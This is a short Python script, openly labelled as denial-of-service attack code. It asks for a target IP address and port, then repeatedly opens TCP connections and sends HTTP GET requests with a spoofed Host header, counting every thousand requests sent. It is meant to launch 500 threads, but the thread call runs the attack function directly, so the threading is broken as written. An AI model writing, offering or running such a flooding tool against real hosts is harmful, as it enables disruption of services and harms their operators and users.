#dos attack code
import sys
import threading
import socket
import datetime
target = str(input('[*] Enter target IP Address:'))
port = int(input('[*] Enter target PORT:'))
fake = '192.168.1.11'

connected = 0#initial connections
def start_attack():#attack function
    try:
        while 1:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.sendto(("GET /"+target+" HTTP/1.1\r\n").encode('ascii'), (target, port))
            sock.sendto(("Host: "+fake+"\r\n\r\n").encode('ascii'), (target, port))
            sock.close()
            global connected
            now = datetime.datetime.now()
            connected+=1
            if connected % 1000 == 0:#prints after sending every 1000 requests
                print(str(connected) + " sent at " + str(now.strftime("%H:%M:%S")))
    except socket.error as msg:
        print("Oops..."+str(msg))
        sys.exit()

if __name__ == '__main__':

    for i in range(500):#500 threads
        thread = threading.Thread(target=start_attack())#threading
        thread.start()